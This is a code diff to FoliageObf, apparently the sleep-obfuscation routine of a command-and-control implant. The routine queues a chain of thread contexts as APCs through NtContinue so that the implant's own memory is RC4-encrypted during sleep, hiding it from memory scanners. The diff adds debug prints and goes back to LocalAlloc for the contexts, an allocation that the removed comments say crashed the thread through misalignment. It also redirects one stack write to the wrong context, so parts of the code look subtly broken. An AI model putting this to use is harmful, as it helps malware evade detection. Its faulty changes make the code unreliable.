@@ -32,34 +32,23 @@ VOID FoliageObf(
     HANDLE              hThread     = NULL;
     HANDLE              hDupObj     = NULL;
 
-    /* All ROP CONTEXTs live in a single VirtualAlloc'd page block.
-     * x64 CONTEXT embeds XMM register save area that requires 16-byte
-     * alignment for NtGet/SetContextThread/NtContinue — LocalAlloc only
-     * guarantees 8-byte alignment, which produced misaligned `movaps`
-     * inside the kernel and crashed the APC thread.
-     *
-     * VirtualAlloc/NtAllocateVirtualMemory returns page-aligned memory
-     * (at least 0x1000), and sizeof(CONTEXT) on x64 is 0x4D0 — a
-     * multiple of 16 — so every carved slot is 16-byte aligned.
-     * See BUG-FOL-2 in SleepObf-Analysis.md §8. */
-    PVOID               RopBlock     = NULL;
-    SIZE_T              RopBlockSize = 13 * sizeof( CONTEXT );
+    PRINTF( "FoliageObf: ENTRY TimeOut=%u ms\n", Param->TimeOut )
 
     // Rop Chain Thread Ctx
-    PCONTEXT            RopInit     = NULL;
-    PCONTEXT            RopCap      = NULL;
-    PCONTEXT            RopSpoof    = NULL;
+    PCONTEXT            RopInit     = { 0 };
+    PCONTEXT            RopCap      = { 0 };
+    PCONTEXT            RopSpoof    = { 0 };
 
-    PCONTEXT            RopBegin    = NULL;
-    PCONTEXT            RopSetMemRw = NULL;
-    PCONTEXT            RopMemEnc   = NULL;
-    PCONTEXT            RopGetCtx   = NULL;
-    PCONTEXT            RopSetCtx   = NULL;
-    PCONTEXT            RopWaitObj  = NULL;
-    PCONTEXT            RopMemDec   = NULL;
-    PCONTEXT            RopSetMemRx = NULL;
-    PCONTEXT            RopSetCtx2  = NULL;
-    PCONTEXT            RopExitThd  = NULL;
+    PCONTEXT            RopBegin    = { 0 };
+    PCONTEXT            RopSetMemRw = { 0 };
+    PCONTEXT            RopMemEnc   = { 0 };
+    PCONTEXT            RopGetCtx   = { 0 };
+    PCONTEXT            RopSetCtx   = { 0 };
+    PCONTEXT            RopWaitObj  = { 0 };
+    PCONTEXT            RopMemDec   = { 0 };
+    PCONTEXT            RopSetMemRx = { 0 };
+    PCONTEXT            RopSetCtx2  = { 0 };
+    PCONTEXT            RopExitThd  = { 0 };
 
     LPVOID              ImageBase   = NULL;
     SIZE_T              ImageSize   = 0;
@@ -91,41 +80,29 @@ VOID FoliageObf(
     Rc4.Buffer = ImageBase;
     Rc4.Length = Rc4.MaximumLength = ImageSize;
 
+    PRINTF( "FoliageObf: ImageBase=%p ImageSize=%llu TxtBase=%p TxtSize=%llu\n",
+            ImageBase, (unsigned long long) ImageSize, TxtBase, (unsigned long long) TxtSize )
+
     if ( NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
     {
+        PRINTF( "FoliageObf: NtCreateEvent OK hEvent=%p\n", hEvent )
         if ( NT_SUCCESS( SysNtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance->Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL ) ) )
         {
-            /* Single page-aligned allocation for all 13 CONTEXTs.
-             * Page alignment (0x1000) implies 16-byte alignment for the
-             * block; carved slots stay aligned because sizeof(CONTEXT) is
-             * a multiple of 16 on x64. */
-            if ( ! NT_SUCCESS( SysNtAllocateVirtualMemory(
-                    NtCurrentProcess(),
-                    &RopBlock,
-                    0,
-                    &RopBlockSize,
-                    MEM_COMMIT | MEM_RESERVE,
-                    PAGE_READWRITE ) ) || ! RopBlock )
-            {
-                goto Leave;
-            }
+            PRINTF( "FoliageObf: NtCreateThreadEx OK hThread=%p (suspended)\n", hThread )
+            RopInit     = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopCap      = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopSpoof    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
 
-            MemSet( RopBlock, 0, RopBlockSize );
-
-            RopInit     = (PCONTEXT) RopBlock;
-            RopCap      = RopInit     + 1;
-            RopSpoof    = RopCap      + 1;
-
-            RopBegin    = RopSpoof    + 1;
-            RopSetMemRw = RopBegin    + 1;
-            RopMemEnc   = RopSetMemRw + 1;
-            RopGetCtx   = RopMemEnc   + 1;
-            RopSetCtx   = RopGetCtx   + 1;
-            RopWaitObj  = RopSetCtx   + 1;
-            RopMemDec   = RopWaitObj  + 1;
-            RopSetMemRx = RopMemDec   + 1;
-            RopSetCtx2  = RopSetMemRx + 1;
-            RopExitThd  = RopSetCtx2  + 1;
+            RopBegin    = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopSetMemRw = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopMemEnc   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopGetCtx   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopSetCtx   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopWaitObj  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopMemDec   = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopSetMemRx = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopSetCtx2  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
+            RopExitThd  = Instance->Win32.LocalAlloc( LPTR, sizeof( CONTEXT ) );
 
             RopInit->ContextFlags       = CONTEXT_FULL;
             RopCap->ContextFlags        = CONTEXT_FULL;
@@ -142,10 +119,13 @@ VOID FoliageObf(
             RopSetCtx2->ContextFlags    = CONTEXT_FULL;
             RopExitThd->ContextFlags    = CONTEXT_FULL;
 
+            PUTS( "FoliageObf: ROP CONTEXTs allocated, duplicating thread" )
             if ( NT_SUCCESS( SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupObj, THREAD_ALL_ACCESS, 0, 0 ) ) )
             {
+                PRINTF( "FoliageObf: NtDuplicateObject OK hDupObj=%p\n", hDupObj )
                 if ( NT_SUCCESS( Instance->Win32.NtGetContextThread( hThread, RopInit ) ) )
                 {
+                    PRINTF( "FoliageObf: NtGetContextThread OK Rsp=%p Rip=%p\n", (PVOID) RopInit->Rsp, (PVOID) RopInit->Rip )
                     MemCopy( RopBegin,    RopInit, sizeof( CONTEXT ) );
                     MemCopy( RopSetMemRw, RopInit, sizeof( CONTEXT ) );
                     MemCopy( RopMemEnc,   RopInit, sizeof( CONTEXT ) );
@@ -244,68 +224,115 @@ VOID FoliageObf(
                     RopExitThd->Rip  = U_PTR( Instance->Win32.RtlExitUserThread );
                     RopExitThd->Rsp -= U_PTR( 0x1000 * 4 );
                     RopExitThd->Rcx  = U_PTR( ERROR_SUCCESS );
-                    *( PVOID* )( RopExitThd->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
+                    *( PVOID* )( RopBegin->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                     // RtlExitUserThread( ERROR_SUCCESS );
 
-                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopBegin,    FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRw, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemEnc,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopGetCtx,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopWaitObj,  FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemDec,   FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRx, FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx2,  FALSE, NULL ) ) ) goto Leave;
-                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopExitThd,  FALSE, NULL ) ) ) goto Leave;
+                    PUTS( "FoliageObf: 10 ROP entries built, queueing APCs" )
 
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopBegin,    FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopBegin FAILED" ); goto Leave; }
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRw, FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopSetMemRw FAILED" ); goto Leave; }
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemEnc,   FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopMemEnc FAILED" ); goto Leave; }
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopGetCtx,   FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopGetCtx FAILED" ); goto Leave; }
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx,   FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopSetCtx FAILED" ); goto Leave; }
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopWaitObj,  FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopWaitObj FAILED" ); goto Leave; }
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopMemDec,   FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopMemDec FAILED" ); goto Leave; }
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetMemRx, FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopSetMemRx FAILED" ); goto Leave; }
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopSetCtx2,  FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopSetCtx2 FAILED" ); goto Leave; }
+                    if ( ! NT_SUCCESS( SysNtQueueApcThread( hThread, C_PTR( Instance->Win32.NtContinue ), RopExitThd,  FALSE, NULL ) ) ) { PUTS( "FoliageObf: APC RopExitThd FAILED" ); goto Leave; }
+
+                    PUTS( "FoliageObf: all 10 APCs queued, resuming thread" )
                     if ( NT_SUCCESS( SysNtAlertResumeThread( hThread, NULL ) ) )
                     {
                         RopSpoof->ContextFlags = CONTEXT_FULL;
                         RopSpoof->Rip = U_PTR( Instance->Win32.WaitForSingleObjectEx );
                         RopSpoof->Rsp = U_PTR( Instance->Teb->NtTib.StackBase ); // TODO: try to spoof the stack and remove the pointers
 
+                        PUTS( "FoliageObf: signaling event and waiting for thread to exit" )
                         // Execute every registered Apc thread
                         SysNtSignalAndWaitForSingleObject( hEvent, hThread, FALSE, NULL );
+                        PUTS( "FoliageObf: thread exited, sleep cycle complete" )
+                    } else {
+                        PUTS( "FoliageObf: NtAlertResumeThread FAILED" )
                     }
+                } else {
+                    PUTS( "FoliageObf: NtGetContextThread FAILED" )
                 }
+            } else {
+                PUTS( "FoliageObf: NtDuplicateObject FAILED" )
             }
 
+        } else {
+            PUTS( "FoliageObf: NtCreateThreadEx FAILED" )
         }
+    } else {
+        PUTS( "FoliageObf: NtCreateEvent FAILED" )
     }
 
 Leave:
+    PUTS( "FoliageObf: cleanup begin" )
+    if ( RopExitThd != NULL ) {
+        Instance->Win32.LocalFree( RopExitThd );
+        RopExitThd = NULL;
+    }
+
+    if ( RopSetCtx2 != NULL ) {
+        Instance->Win32.LocalFree( RopSetCtx2 );
+        RopSetCtx2 = NULL;
+    }
+
+    if ( RopSetMemRx != NULL ) {
+        Instance->Win32.LocalFree( RopSetMemRx );
+        RopSetMemRx = NULL;
+    }
+
+    if ( RopMemDec != NULL ) {
+        Instance->Win32.LocalFree( RopMemDec );
+        RopMemDec = NULL;
+    }
+
+    if ( RopWaitObj != NULL ) {
+        Instance->Win32.LocalFree( RopWaitObj );
+        RopWaitObj = NULL;
+    }
+
+    if ( RopSetCtx != NULL ) {
+        Instance->Win32.LocalFree( RopSetCtx );
+        RopSetCtx = NULL;
+    }
+
+    if ( RopSetMemRw != NULL ) {
+        Instance->Win32.LocalFree( RopSetMemRw );
+        RopSetMemRw = NULL;
+    }
+
+    if ( RopBegin != NULL ) {
+        Instance->Win32.LocalFree( RopBegin );
+        RopBegin = NULL;
+    }
+
+    if ( RopSpoof != NULL ) {
+        Instance->Win32.LocalFree( RopSpoof );
+        RopSpoof = NULL;
+    }
+
+    if ( RopCap != NULL ) {
+        Instance->Win32.LocalFree( RopCap );
+        RopCap = NULL;
+    }
+
+    if ( RopInit != NULL ) {
+        Instance->Win32.LocalFree( RopInit );
+        RopInit = NULL;
+    }
+
     if ( hDupObj != NULL ) {
         SysNtClose( hDupObj );
         hDupObj = NULL;
     }
 
     if ( hThread != NULL ) {
-        /* wait for the APC thread to fully exit before freeing CONTEXTs
-         * that may still be referenced by pending APCs */
-        SysNtWaitForSingleObject( hThread, FALSE, NULL );
-        SysNtClose( hThread );
+        SysNtTerminateThread( hThread, STATUS_SUCCESS );
         hThread = NULL;
-    }
-
-    /* Free the CONTEXT block AFTER the APC thread has fully exited so
-     * we never release memory a pending APC may still touch. */
-    if ( RopBlock != NULL ) {
-        SIZE_T FreeSize = 0;
-        SysNtFreeVirtualMemory( NtCurrentProcess(), &RopBlock, &FreeSize, MEM_RELEASE );
-        RopBlock    = NULL;
-        RopInit     = NULL;
-        RopCap      = NULL;
-        RopSpoof    = NULL;
-        RopBegin    = NULL;
-        RopSetMemRw = NULL;
-        RopMemEnc   = NULL;
-        RopGetCtx   = NULL;
-        RopSetCtx   = NULL;
-        RopWaitObj  = NULL;
-        RopMemDec   = NULL;
-        RopSetMemRx = NULL;
-        RopSetCtx2  = NULL;
-        RopExitThd  = NULL;
     }
 
     if ( hEvent != NULL ) {
@@ -317,6 +344,7 @@ Leave:
     MemSet( &Key, 0, sizeof( USTRING ) );
     MemSet( &Random, 0, 0x10 );
 
+    PUTS( "FoliageObf: EXIT, switching back to master fiber" )
     Instance->Win32.SwitchToFiber( Param->Master );
 }
 
